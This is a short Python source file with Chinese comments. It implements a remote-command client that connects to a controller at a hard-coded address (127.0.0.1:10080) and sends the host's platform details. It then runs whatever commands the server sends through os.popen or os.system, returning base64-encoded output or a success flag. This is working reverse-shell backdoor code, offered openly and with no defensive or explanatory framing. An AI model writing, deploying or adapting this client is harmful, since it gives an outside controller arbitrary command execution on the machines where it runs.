import socket
import os
import platform
import base64
import win32api, win32con

ip_port = ('127.0.0.1', 10080)

s = socket.socket()     # 创建套接字

s.connect(ip_port)      # 连接服务器

info = platform.platform()
s.sendall(info.encode())

while True:     # 通过一个死循环不断接收用户输入，并发送给服务器
    server_option = s.recv(1024).decode()

    if int(server_option) == 1:
        while True:
            server_data = s.recv(1024).decode()
            if server_data == 'exit':
                break
            clinet_reply = os.popen(server_data)
            clinet_reply = clinet_reply.read()
            clinet_reply = clinet_reply.encode('utf-8')
            clinet_reply = base64.b64encode(clinet_reply)
            s.sendall(clinet_reply)


    elif int(server_option) == 2:
        while True:
            server_shell = s.recv(1024).decode()
            if server_shell == 'exit':
                break
            client_result = os.system(server_shell)
            if client_result == 0:
                result = 'success'
            else:
                result = 'false'
            s.sendall(result.encode())

    elif int(server_option) == 3:   # 退出连接
        shell_exit = s.recv(1024).decode()
        print('通信结束！')
        break

s.close()       # 关闭连接